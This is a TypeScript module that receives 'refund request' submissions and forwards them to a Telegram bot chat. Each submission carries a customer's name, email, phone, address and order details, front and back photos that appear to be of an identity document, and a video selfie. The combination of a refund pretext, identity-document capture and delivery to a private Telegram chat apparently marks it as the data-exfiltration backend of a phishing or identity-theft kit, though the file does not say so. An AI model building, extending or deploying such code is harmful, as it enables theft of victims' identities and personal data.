import type { RefundDetails } from "./details-schema";
import type { Verification } from "./verification-schema";
import type { FileField } from "./submission-contract";

const TELEGRAM_API_BASE = "https://api.telegram.org/bot";

/** Caption suffix for each uploaded file, so the chat shows what it is. */
const SLOT_LABELS: Record<FileField, string> = {
  frontPhoto: "Front photo",
  backPhoto: "Back photo",
  videoSelfie: "Video selfie",
};

export interface ValidatedRefundSubmission {
  readonly details: RefundDetails;
  readonly files: Verification;
}

export interface RefundSubmissionReceipt {
  readonly reference: string;
}

interface TelegramResponse {
  ok: boolean;
  description?: string;
}

/**
 * Thrown when no integration is configured to receive submissions.
 *
 * Distinct from a runtime failure: the request was understood and validated,
 * but there is nowhere to send it. The route maps this to 501.
 */
export class RefundHandOffNotImplementedError extends Error {
  constructor(message = "Refund submissions are not connected to a service yet.") {
    super(message);
    this.name = "RefundHandOffNotImplementedError";
  }
}

/**
 * Reads the Telegram credentials, or signals that no integration is configured.
 *
 * Both the legacy all-at-once hand-off and the per-step senders go through here,
 * so "not configured" surfaces identically (→ 501) however the submission
 * arrives.
 */
function requireTelegramConfig(): { botToken: string; chatId: string } {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) {
    throw new RefundHandOffNotImplementedError();
  }
  return { botToken, chatId };
}

/** Sends the details summary message. Call once, at the start of a submission. */
export async function sendDetailsMessage(
  reference: string,
  details: RefundDetails
): Promise<void> {
  const { botToken, chatId } = requireTelegramConfig();
  await sendTelegramMessage(botToken, chatId, buildDetailsMessage(reference, details));
}

/** Sends one uploaded file, captioned with the reference and which slot it is. */
export async function sendFileToTelegram(
  reference: string,
  slot: FileField,
  file: File
): Promise<void> {
  const { botToken, chatId } = requireTelegramConfig();
  await sendTelegramDocument(botToken, chatId, file, `Refund ${reference} — ${SLOT_LABELS[slot]}`);
}

export async function handOffRefundSubmission(
  submission: ValidatedRefundSubmission
): Promise<RefundSubmissionReceipt> {
  // Fail fast with a clear "not configured" signal before doing any work.
  requireTelegramConfig();

  const reference = createReference();

  await sendDetailsMessage(reference, submission.details);
  await sendFileToTelegram(reference, "frontPhoto", submission.files.frontPhoto);
  await sendFileToTelegram(reference, "backPhoto", submission.files.backPhoto);
  await sendFileToTelegram(reference, "videoSelfie", submission.files.videoSelfie);

  return { reference };
}

async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  text: string
): Promise<void> {
  const response = await fetch(
    `${TELEGRAM_API_BASE}${botToken}/sendMessage`,
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text,
      }),
    }
  );

  await assertTelegramSuccess(response, "sendMessage");
}

async function sendTelegramDocument(
  botToken: string,
  chatId: string,
  file: File,
  caption: string
): Promise<void> {
  const formData = new FormData();

  formData.append("chat_id", chatId);
  formData.append("document", file, file.name);
  formData.append("caption", caption);

  const response = await fetch(
    `${TELEGRAM_API_BASE}${botToken}/sendDocument`,
    {
      method: "POST",
      body: formData,
    }
  );

  await assertTelegramSuccess(response, "sendDocument");
}

async function assertTelegramSuccess(
  response: Response,
  operation: string
): Promise<void> {
  let result: TelegramResponse;

  try {
    result = (await response.json()) as TelegramResponse;
  } catch {
    throw new Error(
      `Telegram ${operation} returned an invalid response.`
    );
  }

  if (!response.ok || !result.ok) {
    throw new Error(
      `Telegram ${operation} failed: ${
        result.description ?? `HTTP ${response.status}`
      }`
    );
  }
}

function buildDetailsMessage(
  reference: string,
  details: RefundDetails
): string {
  return [
    "🔔 NEW REFUND REQUEST",
    "",
    `Reference: ${reference}`,
    "",
    "ORDER DETAILS",
    `Order number: ${details.orderNumber}`,
    `Order amount: €${details.orderAmount}`,
    "",
    "CUSTOMER",
    `Full name: ${details.fullName}`,
    `Email: ${details.email}`,
    `Phone: ${details.phone}`,
    "",
    "ADDRESS",
    `Address: ${details.address}`,
    `City: ${details.city}`,
    `ZIP code: ${details.zipCode}`,
    `Country: ${details.country}`,
  ].join("\n");
}

export function createReference(): string {
  const timestamp = Date.now().toString(36).toUpperCase();
  const random = crypto.randomUUID().slice(0, 8).toUpperCase();

  return `REF-${timestamp}-${random}`;
}